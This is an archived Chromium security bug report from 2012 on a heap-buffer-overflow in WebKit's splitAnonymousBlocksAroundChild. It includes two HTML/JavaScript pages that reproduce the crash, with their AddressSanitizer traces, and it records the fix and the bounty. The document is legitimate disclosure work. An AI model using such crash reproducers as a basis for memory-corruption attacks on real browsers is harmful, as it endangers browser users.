# Bad cast in splitAnonymousBlocksAroundChild

| Field | Value |
|-------|-------|
| **Issue ID** | [40053884](https://issues.chromium.org/issues/40053884) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-02-19 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

looks the same to me :| on 108184

**VERSION**  

Chrome Version:

Chromium 19.0.1047.0 (Developer Build 122718)  

OS Linux  

WebKit 535.22 (trunk@108184)

Operating System: linux of 64 bit

**REPRODUCTION CASE**

<html>
<head>
<style>
#el1 {
-webkit-column-count: 2;
}
#el4 {
-webkit-column-span: all;
}
</style>
<script>
onload = function() {
el0 = document.createElement('div')
document.body.appendChild(el0)
el1 = document.createElement('div')
el1.setAttribute('id', 'el1')
el0.appendChild(el1)
el2 = document.createElement('div')
el1.appendChild(el2)
el3 = document.createElement('div')
el1.appendChild(el3)
el4 = document.createElement('div')
el4.setAttribute('id', 'el4')
el1.appendChild(el4)
el4.style.display='table-footer-group'
document.body.offsetTop
el3.style.display='table-row'
document.body.offsetTop
el3.style.display='table-column-group'
document.body.offsetTop
el3.style.display='table-row'
el4.style.display='table-cell'
document.body.offsetTop
el2.style.display='inline'
}
</script>
</head>
<body>
</body>
</html>

--

<html>
<head>
<style>
#el0 {
-webkit-column-count: 2;
}
#el3 {
-webkit-column-span: all;
}
</style>
<script>
onload = function() {
el0 = document.createElement('div')
el0.setAttribute('id', 'el0')
document.body.appendChild(el0)
el1 = document.createElement('div')
el2 = document.createElement('div')
el0.appendChild(el2)
el0.appendChild(el1)
el3 = document.createElement('div')
el3.setAttribute('id', 'el3')
el0.appendChild(el3)
el3.style.display='table-footer-group'
document.body.offsetTop
el1.style.display='table-row'
document.body.offsetTop
el1.style.display='table-column-group'
document.body.offsetTop
el1.style.display='table-row'
document.body.offsetTop
el2.style.display='inline'
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: rendererer + asan  

Crash State:

==3642== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fffecca9910 at pc 0x51b57a5 bp 0x7fffffff8630 sp 0x7fffffff8628  

READ of size 8 at 0x7fffecca9910 thread T0  

#0 0x51b57a5 in WebCore::RenderObjectChildList::insertChildNode(WebCore::RenderObject\*, WebCore::RenderObject\*, WebCore::RenderObject\*, bool) ???:0  

#1 0x4f9b56a in WebCore::RenderBlock::splitAnonymousBlocksAroundChild(WebCore::RenderObject\*) ???:0

0x7fffecca9910 is located 8 bytes to the right of 136-byte region [0x7fffecca9880,0x7fffecca9908)  

allocated by thread T0 here:  

#0 0x7d79d02 in malloc ??:0  

#1 0x520392a in WebCore::RenderTableSection::addChild(WebCore::RenderObject\*, WebCore::RenderObject\*) ???:0  

#2 0x51d9e8d in WebCore::RenderTable::addChild(WebCore::RenderObject\*, WebCore::RenderObject\*) ???:0

---

==6404== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fffecca9b18 at pc 0x51b4f4f bp 0x7fffffff8920 sp 0x7fffffff8918  

READ of size 8 at 0x7fffecca9b18 thread T0  

#0 0x51b4f4f in WebCore::RenderObjectChildList::appendChildNode(WebCore::RenderObject\*, WebCore::RenderObject\*, bool) ???:0  

#1 0x4f9b56a in WebCore::RenderBlock::splitAnonymousBlocksAroundChild(WebCore::RenderObject\*) ???:0

0x7fffecca9b18 is located 16 bytes to the right of 136-byte region [0x7fffecca9a80,0x7fffecca9b08)  

allocated by thread T0 here:  

#0 0x7d79d02 in malloc ??:0  

#1 0x520392a in WebCore::RenderTableSection::addChild(WebCore::RenderObject\*, WebCore::RenderObject\*) ???:0  

#2 0x51d9e8d in WebCore::RenderTable::addChild(WebCore::RenderObject\*, WebCore::RenderObject\*) ???:0  

#3 0x519961a in WebCore::RenderObject::addChild(WebCore::RenderObject\*, WebCore::RenderObject\*) ???:0

## Attachments

- [16136.html](attachments/16136.html) (text/html; charset=us-ascii, 973 B)
- [8136.html](attachments/8136.html) (text/html; charset=us-ascii, 1.1 KB)
- [16136.txt](attachments/16136.txt) (text/x-c; charset=us-ascii, 6.9 KB)
- [8136.txt](attachments/8136.txt) (text/x-c; charset=us-ascii, 7.1 KB)

## Timeline

### in...@chromium.org (2012-02-19)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-19)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-19)

upstreamed - https://bugs.webkit.org/show_bug.cgi?id=78994

### in...@chromium.org (2012-02-19)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-19)

http://trac.webkit.org/changeset/108194

### sc...@gmail.com (2012-03-01)

M17: http://trac.webkit.org/changeset/109414
M18: http://trac.webkit.org/changeset/109416

### sc...@gmail.com (2012-03-03)

$1000

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-03-03)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-28)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/114924?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053884)*
